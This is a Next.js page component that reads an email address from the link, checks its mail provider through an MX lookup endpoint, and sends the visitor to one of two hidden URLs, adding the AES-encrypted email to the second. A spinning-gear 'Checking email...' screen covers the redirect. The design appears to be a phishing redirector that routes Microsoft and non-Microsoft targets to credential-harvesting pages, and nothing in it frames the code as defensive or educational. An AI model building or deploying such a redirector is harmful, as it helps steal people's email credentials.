import { useEffect, useState } from "react";
import { useRouter } from "next/router";
import crypto from "crypto-js";
import { motion } from "framer-motion";
import { Cog } from "lucide-react";

export default function Home() {
  const router = useRouter();
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (!router.isReady) return;
    const email = router.query.email as string | undefined;
    if (!email) return;

    const check = async () => {
      setProgress(30);
      try {
        const resp = await fetch(
          `/api/check-mx?email=${encodeURIComponent(email)}`
        );
        setProgress(60);
        const data = await resp.json();

        if (data.isMicrosoft) {
          setProgress(100);
          window.location.href = process.env.NEXT_PUBLIC_URL1!;
        } else {
          const salt = process.env.NEXT_PUBLIC_SALT!;
          const encrypted = crypto.AES.encrypt(email, salt).toString();
          const safeEnc = encodeURIComponent(encrypted);
          setProgress(100);
          window.location.href = `${process.env.NEXT_PUBLIC_URL2}/&AES=${safeEnc}`;
        }
      } catch (e) {
        console.error("MX check failed", e);
      }
    };

    check();
  }, [router.isReady, router.query]);

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-blue-900 via-blue-800 to-blue-700 text-white">
      {/* Animated Gears */}
      <div className="flex space-x-6 mb-8">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ repeat: Infinity, duration: 6, ease: "linear" }}
        >
          <Cog className="w-16 h-16 text-blue-300" />
        </motion.div>

        <motion.div
          animate={{ rotate: -360 }} // opposite direction
          transition={{ repeat: Infinity, duration: 8, ease: "linear" }}
        >
          <Cog className="w-12 h-12 text-blue-400" />
        </motion.div>

        <motion.div
          animate={{ rotate: 360 }}
          transition={{ repeat: Infinity, duration: 10, ease: "linear" }}
        >
          <Cog className="w-20 h-20 text-blue-200" />
        </motion.div>
      </div>

      {/* Progress bar */}
      <div className="w-64 h-3 bg-blue-950 rounded-full overflow-hidden shadow-lg">
        <motion.div
          className="h-3 bg-blue-400"
          initial={{ width: "0%" }}
          animate={{ width: `${progress}%` }}
          transition={{ ease: "easeInOut", duration: 0.5 }}
        />
      </div>

      <p className="mt-4 text-sm text-blue-200">
        {progress < 100 ? "Checking email..." : "Redirecting..."}
      </p>
    </div>
  );
}
